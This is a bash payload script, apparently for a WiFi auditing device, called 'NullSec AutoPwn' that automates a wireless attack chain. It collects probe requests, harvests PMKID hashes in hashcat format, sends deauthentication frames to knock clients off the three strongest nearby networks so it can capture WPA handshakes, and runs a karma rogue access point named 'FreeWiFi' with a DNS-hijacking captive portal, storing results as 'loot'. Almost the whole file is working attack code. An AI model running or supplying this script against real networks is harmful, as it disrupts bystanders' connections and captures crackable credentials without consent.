#!/bin/bash
# Title: NullSec AutoPwn
# Author: bad-antics
# Description: Fully automated WiFi attack chain - probes, PMKID, handshakes, karma
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
LOG_FILE="$LOOT_DIR/logs/autopwn_$(date +%Y%m%d_%H%M%S).log"

mkdir -p "$LOOT_DIR"/{handshakes,creds,probes,pmkid,logs}

# --- BRIEFING ---
PROMPT "NULLSEC AUTO-PWN

Fully automated attack chain:
- Probe collection
- PMKID harvesting  
- Handshake capture
- Karma + Evil Portal

Duration: ~5 minutes
Loot: $LOOT_DIR

Press OK to configure."

# --- INTERFACE SELECTION ---
ALL_IFS=$(ls /sys/class/net 2>/dev/null | grep -E "wlan|mon")
IFACE_LIST=""
count=1
for iface in $ALL_IFS; do
    IFACE_LIST="${IFACE_LIST}${count}: ${iface}
"
    count=$((count + 1))
done

LIST "SELECT INTERFACE

$IFACE_LIST" IFACE_SEL

# Convert selection to interface name
IFACE=$(echo "$ALL_IFS" | sed -n "${IFACE_SEL}p")
[ -z "$IFACE" ] && IFACE="wlan1mon"

# --- ATTACK OPTIONS ---
LIST "SELECT MODE

1: Full Auto (all phases)
2: Passive Only (probes)
3: PMKID Focus
4: Handshake Focus
5: Karma Only" MODE_SEL

# --- DURATION ---
LIST "ATTACK DURATION

1: Quick (2 min)
2: Standard (5 min)
3: Extended (10 min)
4: Marathon (30 min)" DUR_SEL

case $DUR_SEL in
    1) DURATION=120 ;;
    2) DURATION=300 ;;
    3) DURATION=600 ;;
    4) DURATION=1800 ;;
    *) DURATION=300 ;;
esac

# --- CONFIRMATION ---
PROMPT "READY TO LAUNCH

Interface: $IFACE
Mode: $MODE_SEL
Duration: $((DURATION/60)) min

Press OK to start attack.
Press BACK to cancel."

# --- LOGGING ---
log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

# --- PHASE FUNCTIONS ---
phase_probes() {
    LED B SLOW
    SCREEN "PHASE 1: PROBES" "Collecting probe requests..." 5
    log "Collecting probes for 30s..."
    timeout 30 tcpdump -i "$IFACE" -e -s 256 type mgt subtype probe-req 2>/dev/null | \
        grep -oE "SA:[0-9a-fA-F:]{17}|Probe Request \([^)]+\)" >> "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" &
    wait
    local probe_count=$(wc -l < "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" 2>/dev/null || echo 0)
    log "Captured $probe_count probe entries"
}

phase_pmkid() {
    LED M SLOW
    SCREEN "PHASE 2: PMKID" "Capturing PMKID hashes..." 5
    log "PMKID capture for 60s..."
    
    # Use hcxdumptool if available
    if command -v hcxdumptool >/dev/null 2>&1; then
        timeout 60 hcxdumptool -i "$IFACE" -o "$LOOT_DIR/pmkid/capture_$(date +%Y%m%d_%H%M%S).pcapng" --enable_status=1 2>/dev/null
        # Convert to hashcat format
        hcxpcapngtool -o "$LOOT_DIR/pmkid/pmkid_$(date +%Y%m%d).22000" "$LOOT_DIR/pmkid"/*.pcapng 2>/dev/null
    else
        log "hcxdumptool not found, using airodump"
        timeout 60 airodump-ng "$IFACE" -w "$LOOT_DIR/pmkid/scan" --output-format pcap 2>/dev/null
    fi
    
    local pmkid_count=$(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l || echo 0)
    log "Captured $pmkid_count PMKID hashes"
}

phase_handshake() {
    LED C SLOW
    SCREEN "PHASE 3: HANDSHAKE" "Capturing WPA handshakes..." 5
    log "Scanning for targets..."
    
    # Quick scan
    timeout 20 airodump-ng "$IFACE" -w /tmp/autopwn --output-format csv 2>/dev/null &
    sleep 20
    killall airodump-ng 2>/dev/null
    
    # Get top 3 targets
    cat /tmp/autopwn-01.csv 2>/dev/null | grep -E "^[0-9A-Fa-f]" | head -3 | \
    while IFS=',' read bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        channel=$(echo "$channel" | tr -d ' ')
        essid=$(echo "$essid" | tr -d ' ')
        
        [ -z "$bssid" ] && continue
        
        log "Targeting: $essid ($bssid) CH:$channel"
        SCREEN "TARGET: $essid" "Deauthing on CH $channel..." 3
        
        iwconfig "$IFACE" channel "$channel" 2>/dev/null
        airodump-ng "$IFACE" --bssid "$bssid" -c "$channel" -w "$LOOT_DIR/handshakes/${essid}_$(date +%H%M%S)" --output-format pcap &
        sleep 2
        aireplay-ng -0 5 -a "$bssid" "$IFACE" 2>/dev/null
        sleep 15
        killall airodump-ng 2>/dev/null
    done
    
    local hs_count=$(ls "$LOOT_DIR/handshakes"/*.cap 2>/dev/null | wc -l || echo 0)
    log "Captured $hs_count handshake files"
}

phase_karma() {
    LED Y SLOW
    SCREEN "PHASE 4: KARMA" "Starting rogue AP..." 5
    log "Starting karma attack..."
    
    # Build SSID pool from probes
    if [ -f "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" ]; then
        grep -oE "Probe Request \([^)]+\)" "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" | \
        sed 's/Probe Request (//;s/)//' | sort -u > /tmp/ssid_pool.txt
    fi
    
    # Start hostapd-mana or hostapd with karma
    if command -v hostapd-mana >/dev/null 2>&1; then
        cat > /tmp/karma.conf << 'KARMA'
interface=wlan0
driver=nl80211
hw_mode=g
channel=6
ssid=FreeWiFi
enable_karma=1
karma_loud=1
KARMA
        hostapd-mana /tmp/karma.conf &
    fi
    
    # Simple captive portal
    if command -v dnsmasq >/dev/null 2>&1; then
        dnsmasq --no-daemon --listen-address=10.0.0.1 --dhcp-range=10.0.0.10,10.0.0.100 --address=/#/10.0.0.1 &
    fi
    
    sleep $((DURATION/4))
    killall hostapd-mana dnsmasq 2>/dev/null
    log "Karma phase complete"
}

# --- EXECUTE ATTACK ---
SCREEN "AUTOPWN ACTIVE" "Attack in progress..." 3
LED R FAST

case $MODE_SEL in
    1)  # Full Auto
        phase_probes
        phase_pmkid
        phase_handshake
        phase_karma
        ;;
    2)  # Passive Only
        DURATION=$((DURATION*2))
        phase_probes
        ;;
    3)  # PMKID Focus
        phase_probes
        DURATION=$((DURATION*2))
        phase_pmkid
        ;;
    4)  # Handshake Focus
        phase_probes
        phase_handshake
        ;;
    5)  # Karma Only
        phase_probes
        phase_karma
        ;;
esac

# --- RESULTS ---
LED G SOLID
PROBE_COUNT=$(wc -l < "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" 2>/dev/null || echo 0)
PMKID_COUNT=$(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l || echo 0)
HS_COUNT=$(ls "$LOOT_DIR/handshakes"/*.cap 2>/dev/null | wc -l || echo 0)
CRED_COUNT=$(cat "$LOOT_DIR/creds"/*.txt 2>/dev/null | wc -l || echo 0)

PROMPT "AUTOPWN COMPLETE

LOOT COLLECTED:
Probes: $PROBE_COUNT
PMKIDs: $PMKID_COUNT  
Handshakes: $HS_COUNT
Credentials: $CRED_COUNT

Saved to: $LOOT_DIR
Log: $LOG_FILE

Press OK to exit."

LED OFF
